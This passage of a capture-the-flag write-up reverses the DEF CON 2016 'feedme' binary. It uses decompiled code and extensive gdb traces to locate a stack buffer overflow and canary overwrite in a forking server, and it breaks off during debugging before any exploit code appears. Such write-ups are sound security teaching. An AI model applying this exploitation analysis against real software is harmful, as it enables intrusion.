# defcon quals 2016 feedme

This is based off of a Raytheon SI Govs talk.

Let's take a look at the binary:

```
$    pwn checksec feedme
[*] '/Hackery/pod/modules/bof_static/dcquals16_feedme/feedme'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
$    file feedme
feedme: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, stripped
$    ./feedme
FEED ME!
15935728
0000000000000000000000000000000000000000000000000000000000000000000
ATE 353933353732380a3030303030303030...
*** stack smashing detected ***: ./feedme terminated
Child exit.
FEED ME!
15935728
```

So we can see that we are dealing with a 32 bit statically linked binary, with a Non-Executable stack. When we run it, the program prompts us with `FEED ME!` and we can give input. We also see that we are able to overwrite a stack canary, so we probably have a stack buffer overflow somewhere. In addition to that, when it detected that the stack canary was overwritten it terminated the process, however continued asking us for input. The binary is probably designed in such a way that it spawns child processes which is where we scan in the input and overwrite the stack canary. That way when the program sees that the stack canary has been edited and terminates the process, the parent process spawns another instance and continues asking us for input. Also one more thing, the reason why pwntools says it doesn't have a stack canary is because pwntools looks for a libc call that due to how it was compiled it isn't maid.

### Reversing

Looking for the references to the string `FEED ME!`, we find this:

```
uint feedMeFunc(void)

{
  byte size;
  undefined4 ptr;
  uint result;
  int in_GS_OFFSET;
  undefined input [32];
  int canary;
 
  canary = *(int *)(in_GS_OFFSET + 0x14);
  puts("FEED ME!");
  size = getInt();
  scanInMemory(input,(uint)size);
  ptr = FUN_08048f6e(input,(uint)size,0x10);
  printf("ATE %s\n",ptr);
  result = (uint)size;
  if (canary != *(int *)(in_GS_OFFSET + 0x14)) {
    result = canaryFail();
  }
  return result;
}
```

So we can see it starts off by establishing the stack canary. Proceeding that we call a function called `puts` (I say that it is puts because it takes in a string ptr like puts and prints it, I didn't really look at what the function was doing other than that). Proceeding that it calls the `getInt` function which prompts the user for input, and returns the first byte of the input as an integer. Proceeding that we can see that the function scanInMemory is called. The arguments for that are `input` and `size`. Using a bit of dynamic analysis we can see that the amount of bytes that `scanInMemory` is equivalent to `size`. Also dynamic analysis also tells us that `FUN_08048f6e` just returns a pointer to 16 bytes of our input. Let's look at this in gdb.

First we set gdb to follow the child process on forks, since that is where this code is ran. Also we set breakpoints for the functions `getInt`, `scanInMemory`, and `FUN_08048f6e`:

```
gef➤  set follow-fork-mode child
gef➤  show follow-fork mode
Debugger response to a program call of fork or vfork is "child".
gef➤  b *0x8049053
Breakpoint 1 at 0x8049053
gef➤  b *0x8049069
Breakpoint 2 at 0x8049069
gef➤  b *0x8049084
Breakpoint 3 at 0x8049084
gef➤  r
Starting program: /Hackery/pod/modules/bof_static/dcquals16_feedme/feedme
[New process 14709]
FEED ME!
[Switching to process 14709]
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x9       
$ebx   : 0x080481a8  →   push ebx
$ecx   : 0x080eb4d4  →  0x00000000
$edx   : 0x9       
$esp   : 0xffffcfd0  →  0x080be70c  →  "FEED ME!"
$ebp   : 0xffffd018  →  0xffffd048  →  0xffffd068  →  0x08049970  →   push ebx
$esi   : 0x0       
$edi   : 0x080ea00c  →  0x08067f90  →   mov edx, DWORD PTR [esp+0x4]
$eip   : 0x08049053  →  0xfffdeae8  →  0x00000000
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcfd0│+0x0000: 0x080be70c  →  "FEED ME!"     ← $esp
0xffffcfd4│+0x0004: 0x00000000
0xffffcfd8│+0x0008: 0x00000000
0xffffcfdc│+0x000c: 0x0806ccb7  →   sub esp, 0x20
0xffffcfe0│+0x0010: 0x080ea200  →  0xfbad2887
0xffffcfe4│+0x0014: 0x080ea247  →  0x0eb4d40a
0xffffcfe8│+0x0018: 0x080ea248  →  0x080eb4d4  →  0x00000000
0xffffcfec│+0x001c: 0x00000000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049041                  add    BYTE PTR [ecx-0x3fce0bbb], cl
    0x8049047                  mov    DWORD PTR [esp], 0x80be70c
    0x804904e                  call   0x804fc60
 →  0x8049053                  call   0x8048e42
   ↳   0x8048e42                  push   ebp
       0x8048e43                  mov    ebp, esp
       0x8048e45                  sub    esp, 0x28
       0x8048e48                  mov    DWORD PTR [esp+0x8], 0x1
       0x8048e50                  lea    eax, [ebp-0xd]
       0x8048e53                  mov    DWORD PTR [esp+0x4], eax
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
0x8048e42 (
)
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "feedme", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8049053 → call 0x8048e42
[#1] 0x80490dc → movzx eax, al
[#2] 0x80491da → mov eax, 0x0
[#3] 0x80493ba → mov DWORD PTR [esp], eax
[#4] 0x8048d2b → hlt
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

Thread 2.1 "feedme" hit Breakpoint 1, 0x08049053 in ?? ()
gef➤  s
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x9       
$ebx   : 0x080481a8  →   push ebx
$ecx   : 0x080eb4d4  →  0x00000000
$edx   : 0x9       
$esp   : 0xffffcfcc  →  0x08049058  →   mov BYTE PTR [ebp-0x2d], al
$ebp   : 0xffffd018  →  0xffffd048  →  0xffffd068  →  0x08049970  →   push ebx
$esi   : 0x0       
$edi   : 0x080ea00c  →  0x08067f90  →   mov edx, DWORD PTR [esp+0x4]
$eip   : 0x08048e42  →   push ebp
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcfcc│+0x0000: 0x08049058  →   mov BYTE PTR [ebp-0x2d], al     ← $esp
0xffffcfd0│+0x0004: 0x080be70c  →  "FEED ME!"
0xffffcfd4│+0x0008: 0x00000000
0xffffcfd8│+0x000c: 0x00000000
0xffffcfdc│+0x0010: 0x0806ccb7  →   sub esp, 0x20
0xffffcfe0│+0x0014: 0x080ea200  →  0xfbad2887
0xffffcfe4│+0x0018: 0x080ea247  →  0x0eb4d40a
0xffffcfe8│+0x001c: 0x080ea248  →  0x080eb4d4  →  0x00000000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048e31                  call   0x804fc60
    0x8048e36                  mov    DWORD PTR [esp], 0x1
    0x8048e3d                  call   0x804ed20
 →  0x8048e42                  push   ebp
    0x8048e43                  mov    ebp, esp
    0x8048e45                  sub    esp, 0x28
    0x8048e48                  mov    DWORD PTR [esp+0x8], 0x1
    0x8048e50                  lea    eax, [ebp-0xd]
    0x8048e53                  mov    DWORD PTR [esp+0x4], eax
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "feedme", stopped, reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048e42 → push ebp
[#1] 0x8049058 → mov BYTE PTR [ebp-0x2d], al
[#2] 0x80490dc → movzx eax, al
[#3] 0x80491da → mov eax, 0x0
[#4] 0x80493ba → mov DWORD PTR [esp], eax
[#5] 0x8048d2b → hlt
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x08048e42 in ?? ()
gef➤  finish
Run till exit from #0  0x08048e42 in ?? ()
75395128
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x37      
$ebx   : 0x080481a8  →   push ebx
$ecx   : 0xffffcfbb  →  0x00000137
$edx   : 0x1       
$esp   : 0xffffcfd0  →  0x080be70c  →  "FEED ME!"
$ebp   : 0xffffd018  →  0xffffd048  →  0xffffd068  →  0x08049970  →   push ebx
$esi   : 0x0       
$edi   : 0x080ea00c  →  0x08067f90  →   mov edx, DWORD PTR [esp+0x4]
$eip   : 0x08049058  →   mov BYTE PTR [ebp-0x2d], al
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcfd0│+0x0000: 0x080be70c  →  "FEED ME!"     ← $esp
0xffffcfd4│+0x0004: 0x00000000
0xffffcfd8│+0x0008: 0x00000000
0xffffcfdc│+0x000c: 0x0806ccb7  →   sub esp, 0x20
0xffffcfe0│+0x0010: 0x080ea200  →  0xfbad2887
0xffffcfe4│+0x0014: 0x080ea247  →  0x0eb4d40a
0xffffcfe8│+0x0018: 0x080ea248  →  0x080eb4d4  →  0x00000000
0xffffcfec│+0x001c: 0x00000000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049047                  mov    DWORD PTR [esp], 0x80be70c
    0x804904e                  call   0x804fc60
    0x8049053                  call   0x8048e42
 →  0x8049058                  mov    BYTE PTR [ebp-0x2d], al
    0x804905b                  movzx  eax, BYTE PTR [ebp-0x2d]
    0x804905f                  mov    DWORD PTR [esp+0x4], eax
    0x8049063                  lea    eax, [ebp-0x2c]
    0x8049066                  mov    DWORD PTR [esp], eax
    0x8049069                  call   0x8048e7e
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "feedme", stopped, reason: TEMPORARY BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8049058 → mov BYTE PTR [ebp-0x2d], al
[#1] 0x80490dc → movzx eax, al
[#2] 0x80491da → mov eax, 0x0
[#3] 0x80493ba → mov DWORD PTR [esp], eax
[#4] 0x8048d2b → hlt
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x08049058 in ?? ()
gef➤  5395128
Undefined command: "5395128".  Try "help".
gef➤  p $al
$1 = 0x37
```

For the `getInt` function, we see that we passed it the string `75395128`, and it returned to us `0x39` (which corresponds to the ascii character `7`):

```
gef➤  c
Continuing.
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcfec  →  0x00000000
$ebx   : 0x080481a8  →   push ebx
$ecx   : 0xffffcfbb  →  0x00000137
$edx   : 0x1       
$esp   : 0xffffcfd0  →  0xffffcfec  →  0x00000000
$ebp   : 0xffffd018  →  0xffffd048  →  0xffffd068  →  0x08049970  →   push ebx
$esi   : 0x0       
$edi   : 0x080ea00c  →  0x08067f90  →   mov edx, DWORD PTR [esp+0x4]
$eip   : 0x08049069  →  0xfffe10e8  →  0x00000000
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcfd0│+0x0000: 0xffffcfec  →  0x00000000     ← $esp
0xffffcfd4│+0x0004: 0x00000037 ("7"?)
0xffffcfd8│+0x0008: 0x00000000
0xffffcfdc│+0x000c: 0x0806ccb7  →   sub esp, 0x20
0xffffcfe0│+0x0010: 0x080ea200  →  0xfbad2887
0xffffcfe4│+0x0014: 0x080ea247  →  0x0eb4d40a
0xffffcfe8│+0x0018: 0x370ea248
0xffffcfec│+0x001c: 0x00000000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x804905f                  mov    DWORD PTR [esp+0x4], eax
    0x8049063                  lea    eax, [ebp-0x2c]
    0x8049066                  mov    DWORD PTR [esp], eax
 →  0x8049069                  call   0x8048e7e
   ↳   0x8048e7e                  push   ebp
       0x8048e7f                  mov    ebp, esp
       0x8048e81                  sub    esp, 0x28
       0x8048e84                  mov    eax, DWORD PTR [ebp+0xc]
       0x8048e87                  mov    DWORD PTR [ebp-0x14], eax
       0x8048e8a                  mov    DWORD PTR [ebp-0x10], 0x0
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
0x8048e7e (
)
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "feedme", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8049069 → call 0x8048e7e
[#1] 0x80490dc → movzx eax, al
[#2] 0x80491da → mov eax, 0x0
[#3] 0x80493ba → mov DWORD PTR [esp], eax
[#4] 0x8048d2b → hlt
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

Thread 2.1 "feedme" hit Breakpoint 2, 0x08049069 in ?? ()
gef➤  x/2w $esp
0xffffcfd0:    0xffffcfec    0x37
gef➤  x/40w 0xffffcfec
0xffffcfec:    0x0    0x2710    0x0    0x0
0xffffcffc:    0x0    0x80ea0a0    0x0    0x0
0xffffd00c:    0x44aff700    0x0    0x80ea00c    0xffffd048
0xffffd01c:    0x80490dc    0x80ea0a0    0x0    0x80ed840
0xffffd02c:    0x804f8b4    0x0    0x0    0x0
0xffffd03c:    0x80481a8    0x80481a8    0x0    0xffffd068
0xffffd04c:    0x80491da    0x80ea0a0    0x0    0x2
0xffffd05c:    0x0    0x0    0x80ea00c    0x8049970
0xffffd06c:    0x80493ba    0x1    0xffffd0f4    0xffffd0fc
0xffffd07c:    0x0    0x0    0x80481a8    0x0
gef➤  s
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcfec  →  0x00000000
$ebx   : 0x080481a8  →   push ebx
$ecx   : 0xffffcfbb  →  0x00000137
$edx   : 0x1       
$esp   : 0xffffcfcc  →  0x0804906e  →   movzx eax, BYTE PTR [ebp-0x2d]
$ebp   : 0xffffd018  →  0xffffd048  →  0xffffd068  →  0x08049970  →   push ebx
$esi   : 0x0       
$edi   : 0x080ea00c  →  0x08067f90  →   mov edx, DWORD PTR [esp+0x4]
$eip   : 0x08048e7e  →   push ebp
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcfcc│+0x0000: 0x0804906e  →   movzx eax, BYTE PTR [ebp-0x2d]     ← $esp
0xffffcfd0│+0x0004: 0xffffcfec  →  0x00000000
0xffffcfd4│+0x0008: 0x00000037 ("7"?)
0xffffcfd8│+0x000c: 0x00000000
0xffffcfdc│+0x0010: 0x0806ccb7  →   sub esp, 0x20
0xffffcfe0│+0x0014: 0x080ea200  →  0xfbad2887
0xffffcfe4│+0x0018: 0x080ea247  →  0x0eb4d40a
0xffffcfe8│+0x001c: 0x370ea248
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048e78                  movzx  eax, BYTE PTR [ebp-0xd]
    0x8048e7c                  leave  
    0x8048e7d                  ret    
 →  0x8048e7e                  push   ebp
    0x8048e7f                  mov    ebp, esp
    0x8048e81                  sub    esp, 0x28
    0x8048e84                  mov    eax, DWORD PTR [ebp+0xc]
    0x8048e87                  mov    DWORD PTR [ebp-0x14], eax
    0x8048e8a                  mov    DWORD PTR [ebp-0x10], 0x0
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "feedme", stopped, reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048e7e → push ebp
[#1] 0x804906e → movzx eax, BYTE PTR [ebp-0x2d]
[#2] 0x80490dc → movzx eax, al
[#3] 0x80491da → mov eax, 0x0
[#4] 0x80493ba → mov DWORD PTR [esp], eax
[#5] 0x8048d2b → hlt
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x08048e7e in ?? ()
gef➤  finish
Run till exit from #0  0x08048e7e in ?? ()
00000000000000000000000000000000000000000000000000000000
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x37      
$ebx   : 0x080481a8  →   push ebx
$ecx   : 0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"
$edx   : 0x37      
$esp   : 0xffffcfd0  →  0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"
$ebp   : 0xffffd018  →  0x30303030 ("0000"?)
$esi   : 0x0       
$edi   : 0x080ea00c  →  0x08067f90  →   mov edx, DWORD PTR [esp+0x4]
$eip   : 0x0804906e  →   movzx eax, BYTE PTR [ebp-0x2d]
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcfd0│+0x0000: 0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"     ← $esp
0xffffcfd4│+0x0004: 0x00000037 ("7"?)
0xffffcfd8│+0x0008: 0x00000000
0xffffcfdc│+0x000c: 0x0806ccb7  →   sub esp, 0x20
0xffffcfe0│+0x0010: 0x080ea200  →  0xfbad2887
0xffffcfe4│+0x0014: 0x080ea247  →  0x0eb4d40a
0xffffcfe8│+0x0018: 0x370ea248
0xffffcfec│+0x001c: "00000000000000000000000000000000000000000000000000[...]"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049063                  lea    eax, [ebp-0x2c]
    0x8049066                  mov    DWORD PTR [esp], eax
    0x8049069                  call   0x8048e7e
 →  0x804906e                  movzx  eax, BYTE PTR [ebp-0x2d]
    0x8049072                  mov    DWORD PTR [esp+0x8], 0x10
    0x804907a                  mov    DWORD PTR [esp+0x4], eax
    0x804907e                  lea    eax, [ebp-0x2c]
    0x8049081                  mov    DWORD PTR [esp], eax
    0x8049084                  call   0x8048f6e
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "feedme", stopped, reason: TEMPORARY BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804906e → movzx eax, BYTE PTR [ebp-0x2d]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x0804906e in ?? ()
gef➤  0
Undefined command: "0".  Try "help".
gef➤  x/40w 0xffffcfec
0xffffcfec:    0x30303030    0x30303030    0x30303030    0x30303030
0xffffcffc:    0x30303030    0x30303030    0x30303030    0x30303030
0xffffd00c:    0x30303030    0x30303030    0x30303030    0x30303030
0xffffd01c:    0x30303030    0x8303030    0x0    0x80ed840
0xffffd02c:    0x804f8b4    0x0    0x0    0x0
0xffffd03c:    0x80481a8    0x80481a8    0x0    0xffffd068
0xffffd04c:    0x80491da    0x80ea0a0    0x0    0x2
0xffffd05c:    0x0    0x0    0x80ea00c    0x8049970
0xffffd06c:    0x80493ba    0x1    0xffffd0f4    0xffffd0fc
0xffffd07c:    0x0    0x0    0x80481a8    0x0
```

We can see that the `scanInMemory` function took two arguments, which were the output of `getInt` and a stack pointer. It scanned in `size` amount of bytes into the pointer it was passed. Also even though the function was passed `0x37` as a size, I gave it `0x38` bytes worth of `0` (`0x30`) just to lend more evidence to how I thought this worked:

```
gef➤  s
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x37      
$ebx   : 0x080481a8  →   push ebx
$ecx   : 0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"
$edx   : 0x37      
$esp   : 0xffffcfd0  →  0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"
$ebp   : 0xffffd018  →  0x30303030 ("0000"?)
$esi   : 0x0       
$edi   : 0x080ea00c  →  0x08067f90  →   mov edx, DWORD PTR [esp+0x4]
$eip   : 0x08049072  →   mov DWORD PTR [esp+0x8], 0x10
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcfd0│+0x0000: 0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"     ← $esp
0xffffcfd4│+0x0004: 0x00000037 ("7"?)
0xffffcfd8│+0x0008: 0x00000000
0xffffcfdc│+0x000c: 0x0806ccb7  →   sub esp, 0x20
0xffffcfe0│+0x0010: 0x080ea200  →  0xfbad2887
0xffffcfe4│+0x0014: 0x080ea247  →  0x0eb4d40a
0xffffcfe8│+0x0018: 0x370ea248
0xffffcfec│+0x001c: "00000000000000000000000000000000000000000000000000[...]"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049066                  mov    DWORD PTR [esp], eax
    0x8049069                  call   0x8048e7e
    0x804906e                  movzx  eax, BYTE PTR [ebp-0x2d]
 →  0x8049072                  mov    DWORD PTR [esp+0x8], 0x10
    0x804907a                  mov    DWORD PTR [esp+0x4], eax
    0x804907e                  lea    eax, [ebp-0x2c]
    0x8049081                  mov    DWORD PTR [esp], eax
    0x8049084                  call   0x8048f6e
    0x8049089                  mov    DWORD PTR [esp+0x4], eax
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "feedme", stopped, reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8049072 → mov DWORD PTR [esp+0x8], 0x10
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x08049072 in ?? ()
gef➤  s
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x37      
$ebx   : 0x080481a8  →   push ebx
$ecx   : 0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"
$edx   : 0x37      
$esp   : 0xffffcfd0  →  0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"
$ebp   : 0xffffd018  →  0x30303030 ("0000"?)
$esi   : 0x0       
$edi   : 0x080ea00c  →  0x08067f90  →   mov edx, DWORD PTR [esp+0x4]
$eip   : 0x0804907a  →   mov DWORD PTR [esp+0x4], eax
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcfd0│+0x0000: 0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"     ← $esp
0xffffcfd4│+0x0004: 0x00000037 ("7"?)
0xffffcfd8│+0x0008: 0x00000010
0xffffcfdc│+0x000c: 0x0806ccb7  →   sub esp, 0x20
0xffffcfe0│+0x0010: 0x080ea200  →  0xfbad2887
0xffffcfe4│+0x0014: 0x080ea247  →  0x0eb4d40a
0xffffcfe8│+0x0018: 0x370ea248
0xffffcfec│+0x001c: "00000000000000000000000000000000000000000000000000[...]"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049069                  call   0x8048e7e
    0x804906e                  movzx  eax, BYTE PTR [ebp-0x2d]
    0x8049072                  mov    DWORD PTR [esp+0x8], 0x10
 →  0x804907a                  mov    DWORD PTR [esp+0x4], eax
    0x804907e                  lea    eax, [ebp-0x2c]
    0x8049081                  mov    DWORD PTR [esp], eax
    0x8049084                  call   0x8048f6e
    0x8049089                  mov    DWORD PTR [esp+0x4], eax
    0x804908d                  mov    DWORD PTR [esp], 0x80be715
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "feedme", stopped, reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804907a → mov DWORD PTR [esp+0x4], eax
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x0804907a in ?? ()
gef➤  s
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x37      
$ebx   : 0x080481a8  →   push ebx
$ecx   : 0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"
$edx   : 0x37      
$esp   : 0xffffcfd0  →  0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"
$ebp   : 0xffffd018  →  0x30303030 ("0000"?)
$esi   : 0x0       
$edi   : 0x080ea00c  →  0x08067f90  →   mov edx, DWORD PTR [esp+0x4]
$eip   : 0x0804907e  →   lea eax, [ebp-0x2c]
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcfd0│+0x0000: 0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"     ← $esp
0xffffcfd4│+0x0004: 0x00000037 ("7"?)
0xffffcfd8│+0x0008: 0x00000010
0xffffcfdc│+0x000c: 0x0806ccb7  →   sub esp, 0x20
0xffffcfe0│+0x0010: 0x080ea200  →  0xfbad2887
0xffffcfe4│+0x0014: 0x080ea247  →  0x0eb4d40a
0xffffcfe8│+0x0018: 0x370ea248
0xffffcfec│+0x001c: "00000000000000000000000000000000000000000000000000[...]"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x804906e                  movzx  eax, BYTE PTR [ebp-0x2d]
    0x8049072                  mov    DWORD PTR [esp+0x8], 0x10
    0x804907a                  mov    DWORD PTR [esp+0x4], eax
 →  0x804907e                  lea    eax, [ebp-0x2c]
    0x8049081                  mov    DWORD PTR [esp], eax
    0x8049084                  call   0x8048f6e
    0x8049089                  mov    DWORD PTR [esp+0x4], eax
    0x804908d                  mov    DWORD PTR [esp], 0x80be715
    0x8049094                  call   0x804f700
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "feedme", stopped, reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804907e → lea eax, [ebp-0x2c]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x0804907e in ?? ()
gef➤  s
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"
$ebx   : 0x080481a8  →   push ebx
$ecx   : 0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"
$edx   : 0x37      
$esp   : 0xffffcfd0  →  0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"
$ebp   : 0xffffd018  →  0x30303030 ("0000"?)
$esi   : 0x0       
$edi   : 0x080ea00c  →  0x08067f90  →   mov edx, DWORD PTR [esp+0x4]
$eip   : 0x08049081  →   mov DWORD PTR [esp], eax
